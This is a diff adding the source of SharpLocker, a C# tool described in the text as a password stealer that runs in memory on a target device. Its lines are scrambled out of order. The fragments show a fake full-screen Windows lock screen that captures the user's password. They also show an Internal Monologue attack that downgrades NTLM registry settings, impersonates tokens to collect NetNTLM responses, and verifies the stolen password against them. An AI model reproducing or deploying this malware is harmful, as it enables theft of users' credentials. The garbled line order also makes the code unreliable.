@@ -1,0 +1,2194 @@
+    
+      
+        
+           
+            
+             
+                
+                          
+                           
+                                        
+                                                                
+                                                                 
+                                        $$ 
+                                     $$
+                                    $$ 
+                                    authenticatedUsers.Add(SID)
+                                    console.AddResponse(result)
+                                //Ensure it is a valid response and not blank
+                                continue
+                                if (!result.Resp1.IsNullOrWhiteSpace())
+                                {
+                                }
+                            0x0002 
+                            CloseHandle(dupToken)
+                            console.AddResponses(response.Responses)
+                            continue
+                            if (response == null)
+                            ref dupToken)
+                            using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+                            {
+                            }
+                          $$
+                         $$ 
+                        CloseHandle(token)
+                        DuplicateTokenEx(
+                        Marshal.FreeHGlobal(SecBufferpvBuffer)
+                        catch
+                        finally
+                        foreach (ProcessThread thread in process.Threads)
+                        form.BackColor = Color.Black
+                        form.FormBorderStyle = FormBorderStyle.None
+                        form.ShowDialog()
+                        form.StartPosition = FormStartPosition.Manual
+                        form.WindowState = FormWindowState.Normal
+                        if (!threads)
+                        if (response != null)
+                        int CurrentOffset = Index 
+                        return null
+                        sa.nLength = Marshal.SizeOf(sa)
+                        try
+                        var dupToken = IntPtr.Zero
+                        var sa = new SECURITY_ATTRIBUTES()
+                        {
+                        { /
+                        }
+                       (((uint)block[offset
+                    //Get the SID of the token
+                    //Now iterate over the individual buffers and put them together into a byte array...
+                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
+                    //Undo changes made in the Extended NetNTLM Downgrade
+                    //calculate the total number of bytes we need to copy...
+                    Buffer = new byte[ThisSecBuffer.cbBuffer]
+                    BufferIndex 
+                    BytesToAllocate 
+                    CloseHandle(token)
+                    IntPtr pstr = IntPtr.Zero
+                    LocalFree(pstr)
+                    Lsa.DeleteValue(name)
+                    SID = GetLogonId(token)
+                    SID = Marshal.PtrToStringAuto(pstr)
+                    ThisSecBuffer.Dispose()
+                    console.AddResponse(response)
+                    continue
+                    for (int Index = 0
+                    foreach (Process process in Process.GetProcesses())
+                    int CurrentOffset = Index 
+                    int handleOfDesktop = GetDesktopWindow()
+                    int mostLeft = screen.WorkingArea.Left
+                    int mostTop = screen.WorkingArea.Top
+                    resourceMan = temp
+                    result = value
+                    result[i 
+                    return
+                    return handleOfStartButton
+                    return null
+                    sb.Append(temp[i])
+                    using (Form form = new Form())
+                    {
+                    }
+                )
+                //                result = ConvertHex(ByteArrayToString(user)) 
+                // log errors
+                //Check if the user has been handled previously
+                //Try to get thread handle
+                //result = ConvertHex(ByteArrayToString(user)) 
+                AddResponse(response)
+                Buffer = new byte[BytesToAllocate]
+                ClientToken.Dispose()
+                CloseHandle(token)
+                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength)
+                Marshal.FreeHGlobal(TokenInformation)
+                Marshal.FreeHGlobal(pBuffers)
+                Marshal.FreeHGlobal(pvBuffer)
+                PrintLine()
+                ServerToken.Dispose()
+                String hs = string.Empty
+                StringBuilder sb = new StringBuilder()
+                Thread thread = new Thread(() => WorkThreadFunction(screen))
+                X[i] = ((uint)block[offset
+                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) 
+                ascii 
+                bufferNdx = 0
+                buffer[i] = 0
+                char character = System.Convert.ToChar(decval)
+                components.Dispose()
+                console.AddResponse(response)
+                else
+                for (i = partLen
+                for (int Index = 0
+                for (int j = 0
+                get
+                if (Result)
+                if (ThisSecBuffer.cbBuffer > 0)
+                if (cBuffers == 1)
+                if (downgrade == true 
+                if (downgrade == true)
+                if (handle == IntPtr.Zero)
+                if (impersonate == true)
+                if (screen.Primary == false)
+                if (temp[i] != '-')
+                if (value != null)
+                if (value == null)
+                int BytesToAllocate = 0
+                int TokenInfLength = 1024
+                object oldValue_LMCompatibilityLevel = null
+                object oldValue_NtlmMinClientSec = null
+                object oldValue_RestrictSendingNTLMTraffic = null
+                object value = Lsa.GetValue(name)
+                out ClientLifeTime
+                pBuffers = IntPtr.Zero
+                parms.ExStyle 
+                parms.Style 
+                pvBuffer = IntPtr.Zero
+                ref ClientLifeTime
+                resourceCulture = value
+                result.Domain = ConvertHex(ByteArrayToString(domain))
+                result.Resp1 = ByteArrayToString(lm_resp)
+                result.Resp2 = ByteArrayToString(nt_resp)
+                result.Resp2 = ByteArrayToString(nt_resp).Substring(32)
+                result.UserName = ConvertHex(ByteArrayToString(user))
+                return
+                return ((System.Drawing.Bitmap)(obj))
+                return SID
+                return defaultInstance
+                return false
+                return null
+                return parms
+                return resourceCulture
+                return resourceMan
+                return text.PadRight(width - (width - text.Length) / 2).PadLeft(width)
+                row 
+                serverMessage[22] = (byte)(serverMessage[22] 
+                string SID = null
+                tail[padLen 
+                thread.Start()
+                throw new ArgumentOutOfRangeException()
+                var dupToken = IntPtr.Zero
+                var parms = base.CreateParams
+                var token = IntPtr.Zero
+                {
+                }
+              </xsd:sequence>
+              <xsd:sequence>
+            ((System.ComponentModel.ISupportInitialize)(this.ProfileIcon)).BeginInit()
+            ((System.ComponentModel.ISupportInitialize)(this.ProfileIcon)).EndInit()
+            /
+            // 
+            // Acquire credentials handle for current user
+            // Get a type-1 message from NTLM SSP
+            // Get a type-2 message from NTLM SSP (Server)
+            // LockScreenForm
+            // LockedLabel
+            // PasswordTextBox
+            // ProfileIcon
+            // SubmitPasswordButton
+            // Tamper with the CHALLENGE message
+            // UserNameLabel
+            // We need to remove the dashes that come from the BitConverter
+            // append length before final transform
+            // as per rfc-1320
+            // buffer remaining input
+            // cast this MD4's context (array of 4 uints) into an array of 16 bytes.
+            // compute number of bytes still unhashed
+            // decodes 64 bytes from input block into an array of 16 32-bit
+            // entities. Use A as a temp var.
+            // make sure we don't exceed input's allocated size/length
+            // pad output to 56 mod 64
+            // padding is always binary 1 followed by binary 0's
+            // reset the engine
+            // save low-order byte first.
+            //Console.WriteLine(console.Output())
+            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
+            //Extract the NetNTLM response from a type-3 message and return it
+            //Replace Challenge
+            //Reset reserved bytes to avoid local authentication
+            //this()
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+            : using a System.ComponentModel.TypeConverter
+            </xsd:complexType>
+            <xsd:complexType>
+            AcceptSecurityContext(
+            AcquireCredentialsHandle(
+            Application.EnableVisualStyles()
+            Application.Exit()
+            Application.Run(new LockScreenForm())
+            Application.SetCompatibleTextRenderingDefault(false)
+            BackgroundImage = myimage
+            BackgroundImageLayout = ImageLayout.Stretch
+            BufferType = (int)bufferType
+            BufferType = 2
+            ClientLifeTime.HighPart = 0
+            ClientLifeTime.LowPart = 0
+            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE)
+            ClientToken.Dispose()
+            Console.WriteLine(row)
+            Console.WriteLine(welcome)
+            EngineReset()
+            FormBorderStyle = FormBorderStyle.None
+            HMACMD5 hmac = new HMACMD5(ntlmHash)
+            HMACMD5 hmac = new HMACMD5(ntlmv2Hash)
+            IMChecker checker = new IMChecker(netNTLMv2Response)
+            InitializeComponent()
+            InitializeSecurityContext(
+            IntPtr dwThreadId)
+            IntPtr hObject)
+            LockedLabel.Top = locked
+            MD4 md4 = new MD4()
+            PasswordTextBox.Top = usernameloch
+            PasswordTextBox.UseSystemPasswordChar = true
+            ProfileIcon.Top = usericonh
+            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key)
+            Responses.Add(response)
+            SECURITY_HANDLE _hClientContext
+            SECURITY_HANDLE _hCred
+            SECURITY_HANDLE _hServerContext
+            SECURITY_INTEGER ClientLifeTime
+            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize)
+            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes)
+            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE)
+            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE)
+            ServerToken = new SecBufferDesc(serverMessage)
+            ServerToken.Dispose()
+            StartPosition = FormStartPosition.Manual
+            StringBuilder hex = new StringBuilder(ba.Length 
+            SubmitPasswordButton.Top = buttonh
+            Taskbar.Hide()
+            Taskbar.Show()
+            TopMost = true
+            UnicodeEncoding unicode = new UnicodeEncoding()
+            UserNameLabel.BackColor = Color.Transparent
+            UserNameLabel.Text = userName
+            UserNameLabel.Top = usernameh
+            WindowState = FormWindowState.Normal
+            _hCred.LowPart = _hCred.HighPart = IntPtr.Zero
+            base.Dispose(disposing)
+            base.OnClosing(e)
+            blob = utils.StringToByteArray(strlist[4])
+            buffer = (byte[])md.buffer.Clone()
+            buffer[i] = b
+            byte[] Buffer = null
+            byte[] arr = new byte[hex.Length >> 1]
+            byte[] b = Encoding.UTF8.GetBytes(s)
+            byte[] b = GetByteHashFromString(s)
+            byte[] bytes = new byte[NumberChars / 2]
+            byte[] challengeBytes = StringToByteArray(challenge)
+            byte[] domain = new byte[domain_len]
+            byte[] e = GetByteHashFromByte(b)
+            byte[] e = GetByteHashFromBytes(b)
+            byte[] lm_resp = new byte[lm_resp_len]
+            byte[] nt_resp = new byte[nt_resp_len]
+            byte[] ntlmHash = new byte[16]
+            byte[] ntlmv2Hash = new byte[16]
+            byte[] ntlmv2Response = new byte[16]
+            byte[] ntlmv2ResponseHash = new byte[16]
+            byte[] result = ClientToken.GetSecBufferByteArray()
+            byte[] serverMessage = ServerToken.GetSecBufferByteArray()
+            byte[] targetInfomration = new byte[server_challenege.Length 
+            byte[] user = new byte[user_len]
+            cBuffers = 1
+            catch
+            catch (Exception ex)
+            catch (Exception)
+            cbBuffer = bufferSize
+            cbBuffer = secBufferBytes.Length
+            context = (uint[])md.context.Clone()
+            context[0] 
+            context[0] = 0x67452301
+            context[1] 
+            context[1] = 0xEFCDAB89
+            context[2] 
+            context[2] = 0x98BADCFE
+            context[3] 
+            context[3] = 0x10325476
+            count
+            count 
+            count = 0L
+            count = md.count
+            else
+            else if (nt_resp_len > 24)
+            for (int i = 0
+            foreach (byte b in ba)
+            foreach (string column in columns)
+            foreach (var response in responses)
+            foreach (var screen in Screen.AllScreens)
+            get
+            get {
+            if (DisableESS)
+            if (FromElevated)
+            if (Lsa != null)
+            if (SID.IsNullOrWhiteSpace())
+            if (authenticatedUsers.Contains(SID) == true)
+            if (cBuffers == 1)
+            if (checker.checkPassword(plainpassword))
+            if (disposing 
+            if (hex.Length % 2 == 1)
+            if (i < len)
+            if (i == BLOCK_LENGTH - 1)
+            if (isElevated)
+            if (len >= partLen)
+            if (nt_resp_len == 24)
+            if (offset < 0 
+            if (pBuffers != IntPtr.Zero)
+            if (pBuffers == IntPtr.Zero)
+            if (pvBuffer != IntPtr.Zero)
+            if (resCode != 0 
+            if (response.Resp1.IsNullOrWhiteSpace())
+            if (s.IsNullOrWhiteSpace())
+            if (string.IsNullOrEmpty(text))
+            if (value == null) return true
+            int NumberChars = hex.Length
+            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) 
+            int i = 0
+            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) 
+            int padLen = (bufferNdx < 56) 
+            int partLen = BLOCK_LENGTH - bufferNdx
+            int resCode = InitializeSecurityContext(
+            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) 
+            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) 
+            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) 
+            int val = (int)hex
+            int width = (tableWidth - columns.Length) / columns.Length
+            isElevated = IsElevated()
+            md4.EngineUpdate(b)
+            netNtlmv2ResponseOriginal = utils.StringToByteArray(strlist[3])
+            ntlmHash = md4.GetByteHashFromBytes(unicode.GetBytes(password))
+            ntlmHash = ntlm.getNtlmHash(password)
+            ntlmv2Hash = hmac.ComputeHash(unicode.GetBytes(targetInfomration))
+            ntlmv2Response = hmac.ComputeHash(targetInfomration)
+            originalMessage = netNTLMv2Response
+            out SECURITY_INTEGER ptsExpiry)
+            out SECURITY_INTEGER ptsTimeStamp)
+            out int ReturnLength)
+            output 
+            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer))
+            parseOriginal()
+            private Taskbar()
+            private const int SW_HIDE = 0
+            private const int SW_SHOW = 1
+            private static extern int GetDesktopWindow()
+            protected static int Handle
+            protected static int HandleOfStartButton
+            public IntPtr Sid
+            public SID_AND_ATTRIBUTES User
+            public SID_AND_ATTRIBUTES[] Groups
+            public int GroupCount
+            public static void Hide()
+            public static void Show()
+            public uint Attributes
+            pvBuffer = Marshal.AllocHGlobal(bufferSize)
+            pvBuffer = Marshal.AllocHGlobal(cbBuffer)
+            ref IntPtr TokenHandle)
+            ref IntPtr phNewToken)
+            ref SECURITY_INTEGER ptsExpiry)
+            result = null
+            result.Challenge = challenge
+            result.FromElevated = isElevated
+            result.ImpersonatedIdentity = WindowsIdentity.GetCurrent().Name
+            result.NtlmDowngrade = downgrade
+            result.SID = WindowsIdentity.GetCurrent().User.ToString()
+            return (Buffer)
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator)
+            return arr
+            return ascii
+            return bytes
+            return console
+            return hex.ToString()
+            return md4.EngineDigest()
+            return netntlmv2
+            return new MD4(this)
+            return ntlmHash
+            return ntlmv2Hash
+            return ntlmv2Response
+            return ntlmv2ResponseHash.SequenceEqual(netNtlmv2ResponseOriginal)
+            return output
+            return result
+            return sb.ToString()
+            return string.IsNullOrEmpty(value.Trim())
+            return t << s 
+            return true
+            return val - (val < 58 
+            serverChallenge = utils.StringToByteArray(strlist[2])
+            set {
+            startmonologue(plainpassword)
+            string SID = null
+            string ascii = string.Empty
+            string netntlmv2str = netntlmv2.ToString()
+            string plainpassword = PasswordTextBox.Text
+            string targetInfomration = user.ToUpper() 
+            string temp = BitConverter.ToString(a)
+            string userName = Environment.UserName
+            tail[0] = 0x80
+            target = strlist[1]
+            text = text.Length > width 
+            this.AcceptButton = this.SubmitPasswordButton
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+            this.Controls.Add(this.LockedLabel)
+            this.Controls.Add(this.PasswordTextBox)
+            this.Controls.Add(this.ProfileIcon)
+            this.Controls.Add(this.SubmitPasswordButton)
+            this.Controls.Add(this.UserNameLabel)
+            this.Load 
+            this.LockedLabel = new System.Windows.Forms.Label()
+            this.LockedLabel.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.LockedLabel.AutoSize = true
+            this.LockedLabel.BackColor = System.Drawing.Color.Transparent
+            this.LockedLabel.ForeColor = System.Drawing.Color.White
+            this.LockedLabel.TabIndex = 8
+            this.PasswordTextBox = new System.Windows.Forms.TextBox()
+            this.PasswordTextBox.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.PasswordTextBox.ForeColor = System.Drawing.SystemColors.WindowFrame
+            this.PasswordTextBox.TabIndex = 6
+            this.PasswordTextBox.TextChanged 
+            this.PerformLayout()
+            this.ProfileIcon = new System.Windows.Forms.PictureBox()
+            this.ProfileIcon.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.ProfileIcon.BackColor = System.Drawing.Color.Transparent
+            this.ProfileIcon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
+            this.ProfileIcon.Image = global::SharpLocker.Properties.Resources.thumb_14400082930User
+            this.ProfileIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+            this.ProfileIcon.TabIndex = 1
+            this.ProfileIcon.TabStop = false
+            this.ResumeLayout(false)
+            this.SubmitPasswordButton = new System.Windows.Forms.Button()
+            this.SubmitPasswordButton.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.SubmitPasswordButton.AutoSize = true
+            this.SubmitPasswordButton.BackColor = System.Drawing.Color.Transparent
+            this.SubmitPasswordButton.BackgroundImage = global::SharpLocker.Properties.Resources.arrow
+            this.SubmitPasswordButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
+            this.SubmitPasswordButton.Click 
+            this.SubmitPasswordButton.TabIndex = 9
+            this.SubmitPasswordButton.UseVisualStyleBackColor = false
+            this.SuspendLayout()
+            this.UserNameLabel = new System.Windows.Forms.Label()
+            this.UserNameLabel.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.UserNameLabel.AutoSize = true
+            this.UserNameLabel.ForeColor = System.Drawing.Color.White
+            this.UserNameLabel.TabIndex = 4
+            this.UserNameLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+            this.challenge = challenge
+            this.downgrade = downgrade
+            this.impersonate = impersonate
+            this.restore = restore
+            this.threads = threads
+            this.verbose = verbose
+            try
+            uint A = context[0]
+            uint B = context[1]
+            uint C = context[2]
+            uint ContextAttributes = 0
+            uint D = context[3]
+            uint t = a 
+            ulVersion = 0
+            username = strlist[0]
+            var bufferNdx = (int)(count % BLOCK_LENGTH)
+            var console = new InternalMonologueConsole()
+            var i = (int)(count % BLOCK_LENGTH)
+            var md4 = new MD4()
+            var monologueConsole = monologue.Go()
+            var netntlmv2 = monologueConsole.Output()
+            var result = new InternalMonologueResponse()
+            var result = new byte[16]
+            var sb = new StringBuilder((len - 2) / 2)
+            var tail = new byte[padLen 
+            {
+            { /
+            }
+          </xsd:element>
+        /
+        // Clonable method implementation
+        // Constructors
+        // JCE methods
+        // MD4 specific object variables
+        // The basic MD4 atomic functions.
+        // https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
+        // own methods
+        //-----------------------------------------------------------------------
+        //------------------------------------------------------------------------
+        //-------------------------------------------------------------------------
+        //-----------------------------------------------------------------------------------
+        ///   4 32-bit words (interim result)
+        ///   512-bit input buffer = 16 x 32-bit words holds until it reaches 512 bits
+        ///   512-bit work buffer = 16 x 32-bit words
+        ///   Completes the hash computation by performing final operations such
+        ///   Continues an MD4 message digest using the input byte
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        ///   MD4 basic transformation
+        ///   MD4 block update operation
+        ///   Number of bytes procesed so far mod. 2 power of 64.
+        ///   Overrides the current thread's CurrentUICulture property for all
+        ///   Resets this object disregarding any temporary data present at the
+        ///   Returns a binary hash from an input byte array
+        ///   Returns a byte hash from a string
+        ///   Returns a byte hash from the input byte
+        ///   Returns a string that contains the hexadecimal hash
+        ///   Returns the cached ResourceManager instance used by this class.
+        ///   The size in bytes of the input block to the transformation algorithm
+        ///   This constructor is here to implement the clonability of this class
+        ///   Transforms context based on 512 bits from input block starting
+        ///   for the next update or finish.
+        ///   from the offset'th byte.
+        ///   reset.
+        ///   resource lookups using this strongly typed resource class.
+        ///   time of the invocation of this call.
+        /// </remarks>
+        /// </summary>
+        /// <remarks>
+        /// <returns>String that contains the hex of the hash</returns>
+        /// <returns>binary hash of input</returns>
+        /// <returns>binary hash of the input byte</returns>
+        /// <returns>byte-array that contains the hash</returns>
+        /// <returns>the array of bytes for the resulting hash value.</returns>
+        /// <summary>
+        /// Clean up any resources being used.
+        /// Required designer variable.
+        /// Required method for Designer support - do not modify
+        /// The main entry point for the application.
+        /// the contents of this method with the code editor.
+        //Maintains a list of handled users
+        //Retrieves the SID of a given token
+        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
+        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
+        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
+        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
+        //This function parses the NetNTLM response from a type-3 message
+        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
+        </xsd:choice>
+        <comment>This is a comment</comment>
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        SecurityDelegation
+        [STAThread]
+        [StructLayout(LayoutKind.Sequential)]
+        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
+        const int MAX_TOKEN_SIZE = 12288
+        internal Resources() {
+        internal static System.Drawing.Bitmap Untitled_1 {
+        internal static System.Drawing.Bitmap arrow {
+        internal static System.Drawing.Bitmap button {
+        internal static System.Drawing.Bitmap button1 {
+        internal static System.Drawing.Bitmap button2 {
+        internal static System.Drawing.Bitmap thumb_14400082930User {
+        internal static System.Drawing.Bitmap usericon {
+        internal static global::System.Globalization.CultureInfo Culture {
+        internal static global::System.Resources.ResourceManager ResourceManager {
+        private List<string> authenticatedUsers = new List<string>()
+        private MD4(MD4 md) : this()
+        private System.ComponentModel.IContainer components = null
+        private System.Windows.Forms.Button SubmitPasswordButton
+        private System.Windows.Forms.Label LockedLabel
+        private System.Windows.Forms.Label UserNameLabel
+        private System.Windows.Forms.PictureBox ProfileIcon
+        private System.Windows.Forms.TextBox PasswordTextBox
+        private byte[] EngineDigest()
+        private byte[] blob { get
+        private byte[] buffer = new byte[BLOCK_LENGTH]
+        private byte[] netNtlmv2ResponseOriginal { get
+        private byte[] serverChallenge { get
+        private const int BLOCK_LENGTH = 64
+        private long count
+        private readonly uint[] X = new uint[16]
+        private readonly uint[] context = new uint[4]
+        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())))
+        private static bool IsElevated()
+        private static extern bool CloseHandle(
+        private static extern bool DuplicateTokenEx(
+        private static extern bool OpenProcessToken(
+        private static extern bool OpenThreadToken(
+        private static global::System.Globalization.CultureInfo resourceCulture
+        private static global::System.Resources.ResourceManager resourceMan
+        private static string ByteArrayToString(byte[] ba)
+        private string target { get
+        private string username { get
+        private void EngineReset()
+        private void EngineUpdate(byte b)
+        private void InitializeComponent()
+        private void parseOriginal()
+        protected override CreateParams CreateParams
+        protected override void Dispose(bool disposing)
+        protected override void OnClosing(CancelEventArgs e)
+        public IMChecker(string netNTLMv2Response)
+        public IntPtr HighPart
+        public IntPtr LowPart
+        public IntPtr lpSecurityDescriptor
+        public IntPtr pBuffers
+        public IntPtr pvBuffer
+        public InternalMonologue() { }
+        public InternalMonologueConsole Go()
+        public List<InternalMonologueResponse> Responses = new List<InternalMonologueResponse>()
+        public LockScreenForm()
+        public MD4()
+        public SecBuffer(byte[] secBufferBytes)
+        public SecBuffer(int bufferSize)
+        public SecBufferDesc(byte[] secBufferBytes)
+        public SecBufferDesc(int bufferSize)
+        public bool FromElevated = false
+        public bool NtlmDowngrade = false
+        public bool bInheritHandle
+        public bool checkPassword(string password)
+        public byte[] GetByteHashFromByte(byte b)
+        public byte[] GetByteHashFromBytes(byte[] b)
+        public byte[] GetByteHashFromString(string s)
+        public byte[] GetSecBufferByteArray()
+        public class Taskbar
+        public int BufferType
+        public int HighPart
+        public int PID = 0
+        public int cBuffers
+        public int cbBuffer
+        public int nLength
+        public int ulVersion
+        public object Clone()
+        public override string ToString()
+        public static Settings Default {
+        public static bool IsNullOrWhiteSpace(this string value)
+        public static byte[] StringToByteArray(String hex)
+        public static byte[] StringToByteArray(string hex)
+        public static byte[] getNtlmHash(string password)
+        public static int GetHexVal(char hex)
+        public static string ByteArrayToString(byte[] ba)
+        public static string ConvertHex(String hexString)
+        public string GetHexHashFromByte(byte b)
+        public string GetHexHashFromBytes(byte[] b)
+        public string GetHexHashFromString(string s)
+        public string GetLogonId(IntPtr token)
+        public string Output()
+        public string originalMessage { get
+        public string startmonologue(string plainpassword)
+        public uint LowPart
+        public void AddConsole(string s)
+        public void AddResponse(InternalMonologueResponse response)
+        public void AddResponses(List<InternalMonologueResponse> responses)
+        public void Dispose()
+        public void WorkThreadFunction(Screen screen)
+        static extern IntPtr LocalFree(IntPtr hMem)
+        static extern bool GetTokenInformation(
+        static extern int AcquireCredentialsHandle(
+        static extern int InitializeSecurityContext(
+        static int tableWidth = 73
+        static void Main()
+        static void PrintLine()
+        static void PrintRow(params string[] columns)
+        struct SID_AND_ATTRIBUTES
+        struct TOKEN_GROUPS
+        struct TOKEN_USER
+        {
+        }
+      $$ 
+      $$  _$$<  $$   ____
+      $$  ____/ 
+      $$$$$$
+      $$$$$$$  
+      </xsd:complexType>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>LockScreenForm.cs</DependentUpon>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTime>True</DesignTime>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+      <SubType>Form</SubType>
+      <xsd:complexType>
+     $$ 
+     $$  __$$
+     $$ /  $$ 
+    -->
+    ... ado.net/XML headers 
+    /
+    // This class was auto-generated by the StronglyTypedResourceBuilder
+    // class MD4
+    // class via a tool like ResGen or Visual Studio.
+    ///         IETF RFC-1320 (informational).
+    ///       </li>
+    ///     </ol>         
+    ///     <b>References:</b>
+    ///     <ol>
+    ///   </p>
+    ///   <p>
+    ///   Implements the MD4 message digest algorithm in C
+    /// </remarks>
+    /// </summary>
+    /// <remarks>
+    /// <summary>
+    //this is hack to support .net 3.5 (default installation on Windows 7)
+    </Compile>
+    </EmbeddedResource>
+    </None>
+    </data>
+    </startup>
+    </xsd:element>
+    <AssemblyName>SharpLocker</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <LangVersion>preview</LangVersion>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>WinExe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <ProjectGuid>{A6F8500F-68BC-4EFC-962A-6C6E68D893AF}</ProjectGuid>
+    <RootNamespace>SharpLocker</RootNamespace>
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <startup> 
+    <value>..
+    <value>2.0</value>
+    <value>text/microsoft-resx</value>
+    Classes that don't support this are serialized and stored with the 
+    Example:
+    Microsoft ResX Schema 
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    ResXResourceReader how to depersist the object. This is currently not 
+    The primary goals of this format is to allow a simple XML format 
+    Version 2.0
+    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
+    associated with the data types.
+    class ntlm
+    class utils
+    enum SECURITY_IMPERSONATION_LEVEL
+    extensible. For a given mimetype the value must be set accordingly:
+    internal class MD4
+    internal class Resources {
+    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
+    mimetype set.
+    mimetype: application/x-microsoft.net.object.binary.base64
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    mimetype: application/x-microsoft.net.object.soap.base64
+    name/value pairs.
+    partial class LockScreenForm
+    public class IMChecker
+    public class InternalMonologue
+    public class InternalMonologueConsole
+    public class InternalMonologueResponse
+    public partial class LockScreenForm
+    public partial class LockScreenForm : Form
+    public static class StringExtensions
+    read any of the formats listed below.
+    static class Program
+    struct SECURITY_ATTRIBUTES
+    struct SECURITY_HANDLE
+    struct SECURITY_INTEGER
+    struct SecBuffer : IDisposable
+    struct SecBufferDesc : IDisposable
+    text/value conversion through the TypeConverter architecture. 
+    that is mostly human readable. The generation and parsing of the 
+    type or mimetype. Type corresponds to a .NET class that support 
+    using System
+    value   : The object must be serialized into a byte array 
+    value   : The object must be serialized with 
+    various data types are done through the TypeConverter classes 
+    {
+    }
+   $$ 
+   $$$$$$
+   $$$$$$$
+   --------------------------------------------------------------
+   Java version by Oren Novotny (osn@po.cwru.edu)
+   License is also granted to make and use derivative works provided
+   License to copy and use this software is granted provided that it
+   Ported from Norbert Hranitzky's (norbert.hranitzky@mchp.siemens.de)
+   mentioning or referencing the derived work.
+   or this function.
+   the merchantability of this software or the suitability of this
+   without express or implied warranty of any kind.
+  $$
+  $$ 
+  $$  __$$
+  $$$$$$
+  // Turn off WS_CLIPCHILDREN
+  <!-- 
+  </ItemGroup>
+  </Profiles>
+  </PropertyGroup>
+  </data>
+  </resheader>
+  </xsd:schema>
+  <ItemGroup>
+  <Profiles>
+  <PropertyGroup>
+  <Settings />
+ !tools/packages.config
+ $$ 
+ $$  
+ $$  __$$
+ $$  _____
+ $$$$$$
+ $$$$$$$ 
+ ((b 
+ (56 - bufferNdx) : (120 - bufferNdx)
+ (GetHexVal(hex[(i << 1) 
+ (b 
+ (c 
+ (components != null))
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ (long)offset 
+ -------------------------------------------------------------------------------
+ .NET Core
+ // = 512 / 8
+ // This should be the final size
+ // update number of bytes
+ //Check if the SID is OPSEC safe
+ //LM if NtlmDowngrade = true
+ //rich data object for consumer classes
+ 0x5A827999
+ 0x6ED9EBA1
+ 0xF7)
+ 0xFF) 
+ 0xFF) << 16) 
+ 0xFF) << 24)
+ 0xFF) << 8) 
+ 1])))
+ 48 : 55)
+ 8) >> (8 
+ A .NET application that is supposed to be run in memory on a target device
+ A l   !
+ A password stealing tool that emails plain text credentials
